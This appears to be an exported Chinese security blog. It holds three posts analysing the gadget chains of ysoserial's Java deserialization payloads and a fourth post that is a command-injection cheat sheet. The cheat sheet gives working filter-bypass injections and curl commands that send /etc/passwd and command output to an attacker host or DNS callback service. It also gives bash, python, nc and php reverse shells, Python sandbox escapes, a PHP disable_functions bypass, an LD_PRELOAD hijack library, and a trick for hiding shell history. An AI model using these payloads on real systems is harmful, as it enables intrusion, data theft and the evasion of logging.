<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[ysoserial源码分析(3)]]></title>
    <url>%2F2018%2F05%2F01%2Fysoserial-analysis3.html</url>
    <content type="text"><![CDATA[CommonsCollections2分析：CommonsCollections2和和CommonsBeanutils1一样也使用了比较器去触发TemplatesImpl的newTransformer方法执行命令。这里用到的比较器为TransformingComparator，主要利用了其compare方法：123456public int compare(Object obj1, Object obj2)&#123; Object value1 = transformer.transform(obj1); Object value2 = transformer.transform(obj2); return decorated.compare(value1, value2);&#125; 我们先看一步步看源码，首先是构造templates对象，这个以前分析过，就不再说了，可以翻找前面的文章。然后实例化了一个InvokerTransformer对象，CommonsCollections4.0中InvokerTransformer构造函数稍有一点变化，代码如下：123456public InvokerTransformer(String methodName, Class paramTypes[], Object args[])&#123; iMethodName = methodName; iParamTypes = paramTypes == null ? null : (Class[])paramTypes.clone(); iArgs = args == null ? null : (Object[])((Object []) (args)).clone();&#125; 接着就是将templates对象放进PriorityQueue类里，将transformer对象的iMethodName属性修改为newTransformer，这里再次强调一下，要使用反射修改变量，而不是直接赋值，不然会在生成payload时就执行命令，从而导致无法生成序列化数据。最后返回PriorityQueue对象queue。 反序列化过程调用链如下：12345678910111213ObjectInputStream.readObject PriorityQueue.readObject PriorityQueue.heapify PriorityQueue.siftDown PriorityQueue.siftDownUsingComparator TransformingComparator.compare InvokerTransformer.transform() Method.invoke(templates,iArgs) //这里Method是之前反射修改成的newTransformer,所以这里相当于执行TemplatesImpl.newTransformer TemplatesImpl.getTransletInstance TemplatesImpl.defineTransletClasses TemplatesImpl.TransletClassLoader.defineClass Class.newInstance() Runtime.exec() CommonsCollections3分析：CommonsCollections3适用于commons-collections:3.1，CommonsCollections3与CommonsCollections1差不多，ConstantTransformer的构造略有不同。 这次用的是InstantiateTransformer类，而不再是InvokerTransformer类，InvokerTransformer类主要方法如下,其transform方法会对传入的class进行实例化123456789101112131415161718public InstantiateTransformer(Class[] paramTypes, Object[] args) &#123; super(); iParamTypes = paramTypes; iArgs = args;&#125;......public Object transform(Object input) &#123; try &#123; if (input instanceof Class == false) &#123; throw new FunctorException( "InstantiateTransformer: Input object was not an instanceof Class, it was a " + (input == null ? "null object" : input.getClass().getName())); &#125; Constructor con = ((Class) input).getConstructor(iParamTypes); return con.newInstance(iArgs); &#125; ...... 还用到了一个TrAXFilter类12345678public TrAXFilter(Templates templates) throws TransformerConfigurationException&#123; _templates = templates; _transformer = (TransformerImpl)templates.newTransformer(); _transformerHandler = new TransformerHandlerImpl(_transformer); _overrideDefaultParser = _transformer.overrideDefaultParser();&#125; 看到其中的templates.newTransformer()估计应该能想到整个调用方式了。 我们直接看反序列化调用链，LazyMap.get()方法执行后触发ChainedTransformer链，执行TrAXFilter.class.getConstructor(Templates.class).newInstance(templatesImpl)，也即是new TrAXFilter(templatesImpl),然后触发templates.newTransformer()从而引起了命令执行。 CommonsCollections4分析：commons-collections4以上的版本中已经没有Lazymap.decorate方法，所以使用了别的办法触发transformerChain链。 用到的类基本都是之前payload中用过的，所以下面就简单分析一下。 首先还是构造一个 templates对象，构造的ChainedTransformer链包含ConstantTransformer对象和InstantiateTransformer对象，后面通过反射修改ConstantTransformer的iConstant值为TrAXFilter.class，把InstantiateTransformer的paramTypes, args分别赋值为Templates.class和templates。在反序列化过程中通过PriorityQueue类触发TransformingComparator.compare，然后触发ChainedTransformer.transform执行TrAXFilter.class.getConstructor(Templates.class).newInstance(templatesImpl)从而导致命令执行 CommonsCollections5分析：CommonsCollections5也是适用于3.1版本，利用方式和CommonsCollections1差不多，用到了两个新类TiedMapEntry和BadAttributeValueExpException。 前面都一样，先构造ConstantTransformer链，然后产生lazymap对象，所以的目标还是要触发lazymap的get方法。 重点看一下下面的代码，把生成的lazymap对象传给TiedMapEntry类，看看这个类的关键方法：12345public TiedMapEntry(Map map, Object key) &#123; super(); this.map = map; this.key = key;&#125; 可以看到lazymap被赋值给map。接着又实例化了BadAttributeValueExpException对象val，并通过反射机制把val对象的val属性修改为TiedMapEntry类的对象enrty，最后返回val对象。 BadAttributeValueExpException关键函数如下：1234567891011121314151617181920212223242526272829public BadAttributeValueExpException(Object obj)&#123; val = obj != null ? ((Object) (obj.toString())) : null;&#125;private void readObject(ObjectInputStream objectinputstream) throws IOException, ClassNotFoundException&#123; java.io.ObjectInputStream.GetField getfield = objectinputstream.readFields(); Object obj = getfield.get("val", null); if(obj == null) val = null; else if(obj instanceof String) val = obj; else if(System.getSecurityManager() == null || (obj instanceof Long) || (obj instanceof Integer) || (obj instanceof Float) || (obj instanceof Double) || (obj instanceof Byte) || (obj instanceof Short) || (obj instanceof Boolean)) val = obj.toString(); //执行entry.toSrting else val = (new StringBuilder()).append(System.identityHashCode(obj)).append("@").append(obj.getClass().getName()).toString();&#125;public Object getValue() &#123; return map.get(key);&#125;public String toString() &#123; return getKey() + "=" + getValue();&#125; 我们分析一下反序列化调用链：123456BadAttributeValueExpException.readObject() TiedMapEntry.toSrting() //这里是entry对象 TiedMapEntry.getValue() LazyMap.get() ...... Runtime.exec()]]></content>
  </entry>
  <entry>
    <title><![CDATA[ysoserial源码分析(2)]]></title>
    <url>%2F2018%2F04%2F29%2Fysoserial-analysis2.html</url>
    <content type="text"><![CDATA[这次分析CommonsCollections1…，适用commons-collections:3.1 Gadgets.java：createMemoitizedProxy函数还是和以前一样，先解释用到的其他文件中的函数。 该函数调用了createProxy(createMemoizedInvocationHandler(map), iface, ifaces)方法，先看看createMemoizedInvocationHandler(map)，该方法通过反射return一个InvocationHandler类的实例，并将InvocationHandler类的属性memberValues赋值为map。creatProxy函数的主要作用就是创建动态代理，首先生成了一个数组allIfaces，allIfaces第一个值是iface，即传入createMemoitizedProxy的接口对象，比如CommonsCollections1中传入的是Map接口。如果传入了ifaces值，则使用System.arraycopy方法将ifaces的内容复制到allIfaces数组后面。 最后，返回强制转换为map类型的map代理对象(class.cast方法的作用其实就是强制类型转换，这一点查看Class.cast源代码可以轻易看出) CommonsCollections1分析：首先实例化了ChainedTransformer类，并传入Transformer[]数组，里面包含ConstantTransformer(1)对象。接着又定义了一个Transformer[]数组，我们看看里面的元素，第一个是传入了Runtime.class的ConstantTransformer对象。后面三个都是InvokerTransformer对象，最后的ConstantTransformer(1)可有可无。 ConstantTransformer类主要方法如下，其transform方法返回传入的常量：1234567891011121314public ConstantTransformer(Object constantToReturn) &#123; super(); iConstant = constantToReturn; &#125; /** * Transforms the input by ignoring it and returning the stored constant instead. * * @param input the input object which is ignored * @return the stored constant */ public Object transform(Object input) &#123; return iConstant; &#125; InvokerTransformer类主要方法如下，接收的参数分别是方法名，参数类型和参数值，其transform方法会利用反射执行传入的方法：12345678910111213141516171819public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args;&#125;...... public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); &#125; ...&#125; ChainedTransformer类主要方法如下，其transform方法会循环调用Transformer[]数组中存储的transformer对象的transform方法：123456789101112public ChainedTransformer(Transformer[] transformers) &#123; super(); iTransformers = transformers; &#125;...... public Object transform(Object object) &#123; for (int i = 0; i &lt; iTransformers.length; i++) &#123; object = iTransformers[i].transform(object); &#125; return object; &#125; 利用的关键在于InvokerTransformer类，因为它的transform方法使用了反射机制来执行传入的方法，我们可用通过这一点让其反射执行Runtime.getRuntime().exec()。ysoserial的代码中就构造了一个transform数组，将Runtime.getRuntime().exec(cmd)分解成几部分，第一部分为Runtime.class，保存在ConstantTransformer对象中，第二部分为getMethod,第三部分为invoke,第四部分为exec，后面三部分都保存在InvokerTransformer对象。怎么将这些transform类串起来执行呢，这就用到了ChainedTransformer的transform方法。 如果我们把之前构造的数组作为ChainedTransformer的参数，再执行ChainedTransformer对象的transform方法，那么transform数组中所有的transform类的transform方法都会被依次执行，并且前一个数组元素执行的结果会作为参数传给下一个数组元素:object = iTransformers[i].transform(object); 我们分析一下调用链:1234Runtime.classRuntime.class.getMethod(&quot;getRuntime&quot;)Runtime.class.getMethod(&quot;getRuntime&quot;).invoke()Runtime.class.getMethod(&quot;getRuntime&quot;).invoke().exec(cmd) 通过该调用链，可以成功执行命令。所以只要我们能够触发 ChainedTransformer 对象的 transform() 方法，就可造成命令执行。如何触发该方法呢，这里利用了LazyMap类，LazyMap有个 get 方法，源码如下：123456789public Object get(Object key) &#123; // create value for key if key is not currently in the map if (map.containsKey(key) == false) &#123; Object value = factory.transform(key); map.put(key, value); return value; &#125; return map.get(key);&#125; 我们看到，该方法里面调用了transform方法，如果factory为一个构造好的ChainedTransformer，即可执行exec()。那如何触发get方法呢，这就是后面一部分代码的作用。 先是产生一个HashMap对象innerMap，然后调用了LazyMap.decorate(innerMap, transformerChain)方法，跟进该方法：1234567891011public static Map decorate(Map map, Transformer factory) &#123; return new LazyMap(map, factory); &#125;......protected LazyMap(Map map, Transformer factory) &#123; super(map); if (factory == null) &#123; throw new IllegalArgumentException("Factory must not be null"); &#125; this.factory = factory; &#125; 在这里，我们已经成功把transformerChain赋值给了factory,只差执行get方法了(在CommonCollection4中已经删除了decorate方法)。 对于get方法的执行，实际上是利用了AnnotationInvocationHandler类，该类实现了InvocationHandler接口，可以代理其他对象。我们知道，被代理的对象进行方法调用时，会执行代理类的invoke()方法。而在AnnotationInvocationHandler类的invoke()方法中，存在对其memberValues的get()调用。 12345678910111213141516171819202122public Object invoke(Object obj, Method method, Object aobj[])&#123; String s = method.getName(); Class aclass[] = method.getParameterTypes(); if(s.equals("equals") &amp;&amp; aclass.length == 1 &amp;&amp; aclass[0] == java/lang/Object) return equalsImpl(aobj[0]); if(aclass.length != 0) throw new AssertionError("Too many parameters for an annotation method"); Object obj1 = s; byte byte0 = -1; ...... obj1 = memberValues.get(s); //这里存在对其memberValues执行get方法 if(obj1 == null) throw new IncompleteAnnotationException(type, s); if(obj1 instanceof ExceptionProxy) throw ((ExceptionProxy)obj1).generateException(); if(obj1.getClass().isArray() &amp;&amp; Array.getLength(obj1) != 0) obj1 = cloneArray(obj1); return obj1;&#125; 源码继续往下分析，调用了Gadgets.createMemoitizedProxy(lazyMap, Map.class)，返回值是lazyMap被动态代理后的对象,并且InvocationHandler类的属性memberValues赋值为Lazymap对象。接着又将该对象传递到Gadgets.createMemoizedInvocationHandler方法中，返回的新的AnnotationInvocationHandler对象的memberValue的值为LazyMap的代理对象。（至于为什么要再次封装到AnnotationInvocationHandler里，下文有解释） 最后，通过反射修改transformerChain对象的属性iTransformers值为transformers,然后返回handler。 下面再分析一下反序列过程，看看payload如何触发执行的。 老版本的AnnotationInvocationHandler的readObject()方法代码如下： 现在的AnnotationInvocationHandler的readObject()函数源码如下()： 1234567891011121314151617181920212223242526272829303132333435private void readObject(ObjectInputStream objectinputstream) throws IOException, ClassNotFoundException&#123; java.io.ObjectInputStream.GetField getfield = objectinputstream.readFields(); Class class1 = (Class)getfield.get("type", null); Map map = (Map)getfield.get("memberValues", null); AnnotationType annotationtype = null; try &#123; annotationtype = AnnotationType.getInstance(class1); &#125; catch(IllegalArgumentException illegalargumentexception) &#123; throw new InvalidObjectException("Non-annotation type in annotation serial stream"); &#125; Map map1 = annotationtype.memberTypes(); LinkedHashMap linkedhashmap = new LinkedHashMap(); String s; Object obj; for(Iterator iterator = map.entrySet().iterator(); iterator.hasNext(); linkedhashmap.put(s, obj)) &#123; java.util.Map.Entry entry = (java.util.Map.Entry)iterator.next(); s = (String)entry.getKey(); obj = null; Class class2 = (Class)map1.get(s); if(class2 == null) continue; obj = entry.getValue(); if(!class2.isInstance(obj) &amp;&amp; !(obj instanceof ExceptionProxy)) obj = (new AnnotationTypeMismatchExceptionProxy((new StringBuilder()).append(obj.getClass()).append("[").append(obj).append("]").toString())).setMember((Method)annotationtype.members().get(s)); &#125; UnsafeAccessor.setType(this, class1); UnsafeAccessor.setMemberValues(this, linkedhashmap);&#125; 无论新老版本的代码，AnnotationInvocationHandler的readObject()函数中都对memberValues的调用了entrySet()函数。我们知道memberValues的值是LazyMap的代理对象，当代理对象调用任意方法时，实质是通过其AnnotationInvocationHandler的invoke方法执行，而invoke方法中又存在memberValues.get(s)，这里的memberValues是Lazymap对象，如此一来，顺利执行了LazyMap.get()方法。 整理一下，整个过程的调用链如下：123456AnnotationInvocationHandler.readObject() // handler AnnotationInvocationHandler.memberValues.entrySet() // memberValues值为LazyMap代理对象 AnnotationInvocationHandler.invoke() //此时的 AnnotationInvocationHandler是Gadgets.createMemoitizedProxy(lazyMap, Map.class)执行中所创建 AnnotationInvocationHandler.memberValues.get() //memberValues值为LazyMap对象 ChainedTransformer.transform() Runtime.class.getClass().getMethod("getRuntime").invoke().exec(cmd) 对于ChainedTransformer的触发，网上还有一种payload通过TransformMap来构造，TransformMap的checkSetValue方法也能够执行transform方法从而触发ChainedTransformer链，相关文章有很多，这里也不多说了。]]></content>
  </entry>
  <entry>
    <title><![CDATA[ysoserial源码分析(1)]]></title>
    <url>%2F2018%2F04%2F27%2Fysoserial-analysis1.html</url>
    <content type="text"><![CDATA[一直觉得阅读好的代码对个人的编程能力帮助很大，最近在学习java安全，于是选择ysoserial这一个很有名气的工具进行分析，来丰富和扩展自己的见识，在完整地分析完其中的一个payload后，我也确实收获良多。 首先分析CommonsBeanutils1要用到的Gadgets类： Gadgets.java：createTemplatesImpl函数由于CommonsBeanutils1只用到了createTemplatesImpl方法，所以这里只分析这个函数。该函数主要用来将payload动态写入类，再将类写入字节数组并返回。 我们使用该函数时，是createTemplatesImpl(command)的形式，然后会调用createTemplatesImpl ( final String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory )方法，在该方法里，首先实例化了TemplatesImpl类，之所以使用该类，是因为该类有个字段_bytecodes，可以用来存储对象转化成的字节数组，我们知道如果再将_bytecodes生成java实例，便可方便我们向漏洞程序传payload，而巧的是实现将字节数组转化成java实例的功能在该类中也有相应的实现，综上，TemplatesImpl成为本次利用的类。 接下来就是利用了javassist的一系列类的特性，关于javassist，其实就是一个二方包，和反射功能相似，却比反射更强大，性能开销更低，详细了解可见：http://ju.outofmemory.cn/entry/79911。首先创建类池，然后把需要利用的类加载到搜索路径里，使用pool.get方法获取CtClassType类型的StubTransletPayload类，之后通过clazz.makeClassInitializer().insertAfter(cmd);往StubTransletPayload类的class里写入cmd。这里面的关键是makeClassInitializer函数，这个函数的作用返回一个CtConstructor类型的静态初始化器，如果不存在的话会新建一个，存在的话就返回。然后通过CtConstructor类的insertAfter方法写入cmd，接着使用serName方法产生一个随机值赋予CtClass的qualifiedName变量，对于这个变量，在源码注解中有一段说明： * If the value of this field is not null, then all class * files modified by Javassist are saved under the directory * specified by this variable. For example, if the value is * &lt;code&gt;&quot;./debug&quot;&lt;/code&gt;, then all class files are saved * there. The directory name must not end with a directory * separator such as &lt;code&gt;/&lt;/code&gt;. * * &lt;p&gt;The default value is null. 每次产生不同的值可以使得每次修改产生的class文件放到不同的目录，从而允许重复exploit。然后修改StubTransletPayload父类为abstTranslet，使用toBytecode方法把类导入字节数组。接着利用反射机制将该字节数组及Gadgets.class生成的字节数组所组成的数组赋值给_bytecodes（这里解释一下，ClassFiles.classAsBytes(Foo.class)操作的作用是找到Foo.class的外部类，这里是Gadgets.class，并将其写入字节数组）。最后的，设置TemplatesImpl的两个属性值（这两个属性值在后续调用链中会作为判断条件等，默认值为null，因此需要赋值），并返回TemplatesImpl的对象。 CommonsBeanutils1分析：首先Gadgets.createTemplatesImpl(command)将command通过利用javassist包动态写入到字节数组中，并赋值给templates对象的_bytecodes属性，然后返回templates对象。 在TemplatesImpl中存在以下调用链：1234567TemplatesImpl.getOutputProperties() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() TemplatesImpl.TransletClassLoader Class.newInstance() Runtime.exec() 通过跟踪源码，我们很容易发现上面的调用链，在getTransletInstance方法中部分代码如下： 12345678910111213141516171819private Translet getTransletInstance() throws TransformerConfigurationException &#123; try &#123; if (_name == null) return null; //这就是设置_name值的原因 if (_class == null) defineTransletClasses(); //通过ClassLoader加载字节码，存储在_class数组中 // The translet needs to keep a reference to all its auxiliary // class to prevent the GC from collecting them AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); //新建实例，触发恶意代码 translet.postInitialization(); translet.setTemplates(this); translet.setServicesMechnism(_useServicesMechanism); translet.setAllowedProtocols(_accessExternalStylesheet); if (_auxClasses != null) &#123; translet.setAuxiliaryClasses(_auxClasses); &#125; return translet; &#125; ...... 跟进defineTransletClasses会发现在里面使用了java.lang.ClassLoader.defineClass方法，这个方法我们知道可以从字节数组中读取出class类，而在这里defineTransletClasses方法也是通过defineClass方法来实现字节数组生成java类。接下来的AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); 则将从字节数组中还原的类实例化，从而触发了恶意代码。 现在条理已经很清晰，只要能够自动触发TemplatesImpl.getOutputProperties()方法执行，我们就能达到目的了。而这里，则利用了BeanComparator比较器来触发执行该方法。 剩下的代码实质上就是把template对象放到PriorityQueue类里。我们来具体分析调用过程：1234567891011121314151617final BeanComparator comparator = new BeanComparator("lowestSetBit");// create queue with numbers and basic comparatorfinal PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);// stub data for replacement laterqueue.add(new BigInteger("1"));queue.add(new BigInteger("1"));// switch method called by comparatorReflections.setFieldValue(comparator, "property", "outputProperties");// switch contents of queuefinal Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");queueArray[0] = templates;queueArray[1] = templates;return queue; 我们的反序列化链利用的是PriorityQueue类，利用到的方法如下：1234567891011121314151617181920212223242526public PriorityQueue(int i, Comparator comparator1)&#123; size = 0; modCount = 0; if(i &lt; 1) &#123; throw new IllegalArgumentException(); &#125; else &#123; queue = new Object[i]; comparator = comparator1; return; &#125;&#125;private void readObject(ObjectInputStream objectinputstream) throws IOException, ClassNotFoundException&#123; objectinputstream.defaultReadObject(); objectinputstream.readInt(); SharedSecrets.getJavaOISAccess().checkArray(objectinputstream, [Ljava/lang/Object;, size); queue = new Object[size]; for(int i = 0; i &lt; size; i++) queue[i] = objectinputstream.readObject(); heapify();&#125; 而放入PriorityQueue的对象需要满足两个条件： 实现readObject方法实现Comparable接口 之前储存payload方法使用的TemplatesImpl类满足第一个条件，却不满足第二个，怎么办呢，如果我们直接queue.add(templates)，所造成的后果就是生成payload时会抛出异常。经过跟踪代码，我发现还有一个原因导致不能直接add(templates)，add方法调用了offer方法，不断跟踪offer方法的调用发现最终会触发TemplatesImpl.getOutputProperties()，这样就导致我们生成payload的过程中就会执行命令从而导致payload生成失败，这是显然是我们不希望看到的。 所以代码这里首先实例化BeanComparator类，将property设置为lowestSetBit(这是BigInteger的一个可比较属性，这里也可设置为BigInteger类的其他的可比较属性)，接着add(new BigInteger(&quot;1&quot;))，这些都是为了满足这两个条件从而不让代码抛出异常。后面利用反射机制动态修改放入到PriorityQueue的对象，从而绕过了第二个条件的限制。 我们看到代码这里利用反射机制将 Comparator的property 设置为 TemplatesImpl 的属性 outputProperties(在反序列化时会导致触发执行getOutputProperties()方法)，并获取了 PriorityQueue 的内置属性数组 queue，将 templates 按照索引值填入了 queue，然后返回PriorityQueue的实例化对象queue. 至此payload的构成算是完毕，简单看一下payload是如何工作的： 当我们的payload被漏洞程序反序列化时，调用了PriorityQueue的readObject() 函数，整个反序列化调用链如下：1234567891011121314ObjectInputStream.readObject PriorityQueue.readObject PriorityQueue.heapify PriorityQueue.siftDown PriorityQueue.siftDownUsingComparator BeanComparator.compare PropertyUtils.getProperty( o1, property ) TemplatesImpl.getOutputProperties TemplatesImpl.newTransformer TemplatesImpl.getTransletInstance TemplatesImpl.defineTransletClasses TemplatesImpl.TransletClassLoader.defineClass Class.newInstance() Runtime.exec() 通过该调用链，顺利执行了命令。 这次分析先到这里，后面会抽空把其他payload分析一遍。]]></content>
  </entry>
  <entry>
    <title><![CDATA[各种命令执行总结]]></title>
    <url>%2F2018%2F03%2F23%2Fcommand-execute.html</url>
    <content type="text"><![CDATA[好久没更博客了，就把笔记里的东西整理一下发出来，里面还是有一些少见的trick的~本文持续更新~ 首先说一个小trick:在渗透过程中，我们常常需要清理痕迹，而在history中会记录命令执行历史，我们可以清除history。也有一个简单方法使得在终端执行的命令不被记录，实现方法很简单，在执行的命令前添加空格即可，该方法仅限在debain内核的系统中。 0X01 linux命令执行如何判断是否是linux命令执行可以使用的判断方法有&amp;+命令或|+命令，如： ping &amp;id 或 ping |idcurl &amp;id 或 curl |id 通过返回结果可判断是否是命令执行，同时这也是在前面有ping和curl的情况下进行命令执行的一种方法 读取文件当cat被过滤时，可尝试一下几种读取文件方法： strings flag.phpecho &gt; flag.phpuniq -c flag.phpbash -v flag.phprev flag.php 或者使用curl上传到vps，并在vps上开启监听进行读取： curl -T flag.php “http://192.168.x.xxx:6666“或curl “http://vps/“ –data-binary @/etc/passwd…在vps上：nc -lvpn 6666 空格绕过如果过滤了空格，常用的绕过方法有 $IFS{ls,-l}cat%09flag.phpcat &lt; flag.phpcat&lt;&gt;flag.php 其中后面两个适用于读取文件,而前两个则可完全代替空格，中间的%09需在php环境下，为了避免$IFS与后面的字符串写在一起被误解，需要分隔开$IFS，常用的方法有一下几种： ${IFS}$IFS$9$IFS\ 这里解释一下，$9是linux系统shell进程的第九个参数，始终为空字符串 /绕过 ${PATH:0:1} // ${str:a:b}表示提取字符串a开始的b个字符 ${PATH%%u*} 上面两个都能得到’/‘字符 利用同样的思路(即字符串截取)，我们可以得到更多~ 当然，一切都要建立在没有过滤$,{和}的基础上 加号绕过 $PS4 大于号绕过 $PS2 对某些命令的过滤当某些命令被正则匹配的方式过滤时，可以考虑的绕过方法如下： 字符串拼接： a=un;b=ame;$a$b若’;’被过滤，还可用%0a代替分号a=un%0ab=ame%0a$a$b 字符串截取： root@xxx:~# echo ${PATH:9:1}${PATH:11:1}lsroot@xxx:~# ${PATH:9:1}${PATH:11:1}Desktop 公共 模板 视频 图片 文档 下载 音乐 桌面 如果冒号被过滤，可以使用：root@xxx:~# $(expr substr $PATH 10 1)$(expr substr $PATH 12 1)Desktop 公共 模板 视频 图片 文档 下载 音乐 桌面 base64编码： root@xxx:~# echo “dW5hbWU=” | base64 -d |bashroot xxd（16进制）: root@xxx:~# printf “77686f616d69” | xxd -r -p | bashroot 利用反斜线来绕过: una\me 插入空字符串： u``nameu’’nameu””nameu${xxx}name 对文件名的过滤可用正则绕过，如flag被过滤的情况下读取flag.php，则可以使用：cat fla*来绕过 多条命令执行常见于curl/ping x.x.x.x,且x.x.x.x可控，此时可利用管道符，逻辑运算符，分号及%0a来绕过 ping x.x.x.x |lsping x.x.x.x ||lsping x.x.x.x&amp;lsping x.x.x.x&amp;&amp;lsping x.x.x.x;ls 在地址栏执行时可以利用回车的url编码%0a绕过：ping x.x.x.x%0als 对回显限制如果对回显中的特殊字符进行检测，则可以通过base64或16进制编码绕过，如 ls|base64 无回显可尝试构建一条带外信道提取数据，如： curl (你的ip)/?`whoami` 然后查看Apache日志curl `whoami`.3eea625fcaceaafc7db2.d.zhack.ca (该网站能直接返回接受的数据)S命令执行返回的结果不能包含空格和回车，可以通过base64编码或者如cat flag.php|sed &#39;s/[[:space:]]//g&#39;来清除空格,回车替换可以用sed &#39;:a;N;s/\n/*/;ba&#39;，这样就将回车换成了*S号 (因为sed默认是逐行处理数据，所以sed默认情况下不会处理到换行符，直接用sed s/\n/*/g不可行) 如果不想编码，还可以将数据附在HTTP头，如curl &quot;http://vpsip/&quot; -H &quot;User-Agent: $(id)&quot;或者post数据：id | curl &quot;http://vpsip/&quot; --data-binary @- 0X02 常用shell反弹网上有很多文章总结了，这里简单列举几个: bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1 python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.0.0.1”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f php -r ‘$sock=fsockopen(“10.0.0.1”,1234);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’ 0X03 Python命令执行下面是python中可用于命令执行的模块 ossubprocesscommandsplatformtimeitpicklepydoc 举例： 123#coding:utf-8import timeittimeit.timeit("__import__('os').system('')", number=1) 12import platformprint platform.popen('id', mode='r', bufsize=-1).read() 123import osos.system() print os.popen().read() 123import subprocesssubprocess.call(["cmd","arg1","arg2"],shell=True)subprocess.Popen('ls', shell=True) 12import commandsprint commands.getoutput('ls') 12import pydocpydoc.pipepager(None,'id') 12import picklepickle.loads("cos\nsystem\n(S'ifconfig'\ntR.") 当常见的os,subprocess,commands等被过滤时，除了可尝试用另外几个模块来实现命令执行外，也可灵活使用rot13编码绕过： 其中，有一点需要注意的是，subprocess中的shell如果shell=True的话，curl命令是被Bash(Sh)启动，所以支持shell语法。 如果shell=False的话，启动的是可执行程序本身，后面的参数不再支持shell语法(即执行的命令不能带有参数)。 pydoc更多玩法当系统中PAGER环境变量被设置时，pydoc模块将使用该值作为导入文档，这一点可以被用来执行任意命令，比如：12341.py：#!/usr/bin/pythonimport pydocpydoc.pager("") 此时在命令行: $ export PAGER=”whoami”$ python 1.py 此时命令行会显示结果: root python沙盒绕过简单的沙盒的绕过方法可以通过编码，如12#coding: rot_13&apos;vzcbeg bf&apos; //import os 有篇文章详细介绍了python沙盒绕过的各种方法：Python沙箱逃逸的n种姿势，这篇文章讲的很全面，这里就不再重述 0X04 PHP命令执行常用的php环境下命令执行操作汇总如下： 获取当前文件路径 echo dirname(__FILE__) ;echo getcwd(); 获取同目录下的所有文件名称 echo var_dump(glob(‘./*’));system(“ls”)/system(“dir”)/system–&gt;可换成执行系统命令的函数; 读取某个文件的内容 echo file_get_contents(“flag.php”);echo fgets(fopen(“flag.php”,”r”));show_source(“flag.php”);echo fread(fopen(“flag.php”,”r”),filesize(“flag.php”));echo var_dump(file(“flag.php”));copy(“flag.php”,”daiker.txt”);include ‘php://filter/read=convert.base64-encode/resource=flag.php’;highlight_file(“flag.php”); php配置文件里面有个disable_functions = …，可以用来禁止某些php函数，若常见能够执行系统命令的函数被禁用，又如何命令执行呢首先看看能够执行命令的函数： systemassertpassthruexecpcntl_execshell_execpopenproc_open 由于函数未禁用全，从而导致命令执行的案例也是很多的，所以当一些函数被禁止时，可尝试其他一些函数 当以上函数都被过滤时，可以使用下面几种方法： 拓展库绕过Linux下可通过编译拓展库进行绕过，在得知目标服务器的php版本后，本地下载相同版本的php源码包，并生成一个精心构造的拓展库，再使用dl函数调用拓展库即可实现命令执行，具体操作如下：123456789101112131415161718192021222324252627下载好php源码包后：tar zxvf php-5.3.10.tar.gzcd php-5.3.10/ext./ext_skel --extname=shell //生成名为shell的拓展库cd shellvi config.m4将以下三行前面的dnl去掉，然后保存退出：PHP_ARG_WITH(dl, for dl support,Make sure that the comment is aligned:[ --with-dl Include dl support])whereis phpize //找出phpize路径/usr/local/bin/phpize // 运行phpizevi shell.c在if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, &quot;s&quot;, &amp;arg, &amp;arg_len) == FAILURE) &#123; return;&#125;这一行下面添加：system(arg)然后：whereis php-config //找出php-config的路径./configure --with-php-config=php-config路径makemake install 将生成的拓展库文件/usr/local/lib/php/extensions/no-debug-non-zts-20180130/shell.so拷贝到extension_dir目录下，若extension_dir目录无写权限则先写入任意目录 , 在payload中用../../来实现调用payload如下：1234&lt;?phpdl("shell.so"); //shell.so在extension_dir目录，如不在则用../../来实现调用confirm_dl_compiled("$_GET[a]&gt;flag.txt");?&gt; cat flag.txt便可看到命令执行结果，当然，如果dl函数被禁用，该方法便无效了 LD_PRELOAD劫持当disable_functions 中没有禁止 putenv函数时，可以考虑上传个so文件进行LD_PRELOAD劫持，方法如下：在本地，vim shell.c 12345678910111213#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt; void payload() &#123; system("curl `whoami`.9b8534989b407ad73d33.d.zhack.ca");&#125; int geteuid() &#123;if (getenv("LD_PRELOAD") == NULL) &#123; return 0; &#125;unsetenv("LD_PRELOAD");payload();&#125; 当这个共享库中的geteuid被调用时，会加载payload()函数，从而实现执行命令。本地把它编译为一个位置信息无关的动态共享库： $ gcc -c -fPIC shell.c -o shell$ gcc -shared shell -o shell.so 写一个简单的利用文件1.php：1234&lt;?phpputenv("LD_PRELOAD=./shell.so");mail("root@localhost","","","","");?&gt; 将生成的shell.so及1.php上传到目标服务器，浏览器访问1.php，在dnsbin（可换成自己的vps）上可接收到whoami执行后的结果 更新 不过上面的利方式存在诸多问题导致可能无法成功利用,比如系统没有安装sendmail。不过，文章 无需sendmail：巧用LD_PRELOAD突破disable_functions中提到的启动新进程的方法，解决了sendmail没有安装的问题，只需找到能够启动外部进程的php函数即可，这里可以做到的函数有mail,imap_mail,mb_send_mail,还有一个是error_log，使用上面文章中提供的so文件，再修改一下php文件，内容如下：123456789101112131415&lt;?php echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;; $cmd = $_GET[&quot;cmd&quot;]; $out_path = $_GET[&quot;outpath&quot;]; $evil_cmdline = $cmd . &quot; 